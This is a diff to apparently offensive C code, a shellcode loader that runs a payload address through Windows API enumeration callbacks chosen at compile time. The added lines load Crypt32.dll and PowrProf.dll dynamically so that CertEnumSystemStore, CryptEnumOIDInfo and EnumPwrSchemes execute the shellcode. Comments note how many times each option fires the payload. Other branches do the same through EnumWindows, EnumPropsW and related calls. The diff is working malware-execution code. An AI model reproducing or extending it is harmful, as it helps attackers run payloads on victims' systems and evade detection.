@@ -52,14 +52,34 @@ int entry(int argc, char** argv) {
 
     // Run payload via callback
 #ifdef EXEC_CERTENUMSYSTEMSTORE
-    // FIXME This is broken right now, something with wincrypt.h
-    #include <wincrypt.h>
-    CertEnumSystemStore(
-        CERT_SYSTEM_STORE_CURRENT_USER,
-        0,
-        0,
-        (PFN_CERT_ENUM_SYSTEM_STORE)scAddr
-    );
+    // NOTE: potentially dangerous, runs numerous times
+    /* #include <wincrypt.h> */
+    typedef bool (__cdecl* MYPROC)(DWORD, void*, void*, void*);
+
+    HMODULE lib = LoadLibrary("Crypt32.dll");
+    if (lib != NULL) {
+        MYPROC CertEnumSystemStore = (MYPROC) GetProcAddress(
+            lib, "CertEnumSystemStore"
+        );
+        if (CertEnumSystemStore != NULL) {
+            CertEnumSystemStore(
+                CERT_SYSTEM_STORE_CURRENT_SERVICE, // ok choice ~9x
+                // CERT_SYSTEM_STORE_CURRENT_USER, // meh ~13x
+                // ok choice ~9x
+                // CERT_SYSTEM_STORE_CURRENT_USER_GROUP_POLICY,
+                // CERT_SYSTEM_STORE_LOCAL_MACHINE, // NO! DANGEROUS!
+                // meh ~13x
+                // CERT_SYSTEM_STORE_LOCAL_MACHINE_ENTERPRISE,
+                // meh ~12x
+                // CERT_SYSTEM_STORE_LOCAL_MACHINE_GROUP_POLICY,
+                // CERT_SYSTEM_STORE_SERVICES, // Nothing here
+                // CERT_SYSTEM_STORE_USERS, // meh ~11x
+                0,
+                0,
+                scAddr
+            );
+        }
+    }
 #elifdef EXEC_COPYFILE2
     COPYFILE2_EXTENDED_PARAMETERS params;
 
@@ -76,9 +96,36 @@ int entry(int argc, char** argv) {
         &params
     );
 #elifdef EXEC_CRYPTENUMOIDINFO
-    // FIXME This is broken right now, something with wincrypt.h
-    #include <wincrypt.h>
-    CryptEnumOIDInfo(0, 0, 0, (PFN_CRYPT_ENUM_OID_INFO)scAddr);
+    // NOTE: potentially dangerous, runs numerous times
+    /* #include <wincrypt.h> */
+    typedef bool (__cdecl* MYPROC)(DWORD, DWORD, void*, void*);
+
+    HMODULE lib = LoadLibrary("Crypt32.dll");
+    if (lib != NULL) {
+        MYPROC CryptEnumOIDInfo = (MYPROC) GetProcAddress(
+            lib, "CryptEnumOIDInfo"
+        );
+        if (CryptEnumOIDInfo != NULL) {
+            CryptEnumOIDInfo(
+                // CRYPT_ENCRYPT_ALG_OID_GROUP_ID, // Too many
+                // CRYPT_ENHKEY_USAGE_OID_GROUP_ID, // NO! DANGEROUS!
+                // CRYPT_EXT_OR_ATTR_OID_GROUP_ID, // NO! DANGEROUS!
+                // CRYPT_FIRST_ALG_OID_GROUP_ID, // Too many
+                // CRYPT_HASH_ALG_OID_GROUP_ID, // Too many
+                CRYPT_KDF_OID_GROUP_ID, // Good choice ~3x
+                // CRYPT_LAST_ALG_OID_GROUP_ID, // NO! DANGEROUS!
+                // CRYPT_LAST_OID_GROUP_ID, // Good choice ~3x
+                // CRYPT_POLICY_OID_GROUP_ID, // Ok choice ~6x
+                // CRYPT_PUBKEY_ALG_OID_GROUP_ID, // NO! DANGEROUS!
+                // CRYPT_RDN_ATTR_OID_GROUP_ID, // NO! DANGEROUS!
+                // CRYPT_SIGN_ALG_OID_GROUP_ID, // NO! DANGEROUS!
+                // CRYPT_TEMPLATE_OID_GROUP_ID, // Nothing here
+                0,
+                0,
+                scAddr
+            );
+        }
+    }
 #elifdef EXEC_ENUMCALENDARINFO
     EnumCalendarInfoExEx(
         (CALINFO_ENUMPROCEXEX)scAddr,
@@ -91,14 +138,23 @@ int entry(int argc, char** argv) {
 #elifdef EXEC_ENUMDISPLAYMONITORS
     EnumDisplayMonitors(0, 0, (MONITORENUMPROC)scAddr, 0);
 #elifdef EXEC_ENUMPWRSCHEMES
-    // FIXME This is broken right now, something with powrprof.h
-    #include <powrprof.h>
-    EnumPwrSchemes((PWRSCHEMESENUMPROC)scAddr, 0);
+    /* #include <powrprof.h> */
+    typedef bool (__cdecl* MYPROC)(void*, void*);
+
+    HMODULE lib = LoadLibrary("PowrProf.dll");
+    if (lib != NULL) {
+        MYPROC EnumPwrSchemes = (MYPROC) GetProcAddress(
+            lib, "EnumPwrSchemes"
+        );
+        if (EnumPwrSchemes != NULL) {
+            EnumPwrSchemes(scAddr, 0);
+        }
+    }
 #elifdef EXEC_ENUMPROPS
-    // NOTE runs payload twice
+    // NOTE: runs payload twice
     EnumPropsW(GetTopWindow(0), (PROPENUMPROCW)scAddr);
 #elifdef EXEC_ENUMWINDOWS
-    // FIXME dangerous, runs payload NUMEROUS times
+    // NOTE: dangerous, runs payload NUMEROUS times
     EnumWindows((WNDENUMPROC)scAddr, 0);
 #elifdef EXEC_SETTIMER
     MSG msg;
